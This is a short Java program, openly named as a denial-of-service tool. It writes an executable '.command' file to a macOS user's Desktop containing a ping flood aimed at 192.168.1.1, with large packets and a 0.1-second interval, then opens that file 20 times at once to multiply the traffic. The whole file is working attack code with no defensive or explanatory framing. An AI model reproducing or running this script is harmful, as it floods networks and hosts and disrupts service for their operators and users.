import java.awt.Desktop;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.Writer;

public class DoS {

	private static Desktop desktop = Desktop.getDesktop();
	private static String host = "192.168.1.1";
	private static int sizeInBytes = 8183;
	private static int TTL = 255;
	private static double WaitTime = 0.1;

	private static final int numberOfCall = 20;

	private static final String compName = "Name of computer";
	private static String name = "Hacking";
	private static final String fileExtension = "command";
	private static String fileName = name + "." + fileExtension;

	private static final String text = "ping " + host + " -s " + sizeInBytes + " -m " + TTL + "  -i " + WaitTime;
	static String path = File.separator + "Users" + File.separator + compName + File.separator + "Desktop"
			+ File.separator + fileName;

	public static void main(String[] args) throws IOException {
		File file = new File(path);
		file.delete();
		Writer writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(path)));
		writer.write(text);
		writer.close();

		file.setExecutable(true);

		openFiles(file, numberOfCall);
		file.deleteOnExit();
	}

	public static void openFiles(File file, int NumberOfFiles) throws IOException {

		if (!Desktop.isDesktopSupported()) {
			System.out.println("Desktop is not supported");
			return;
		}

		if (file.exists())
			for (int i = 0; i < NumberOfFiles; i++)
				desktop.open(file);
	}
}
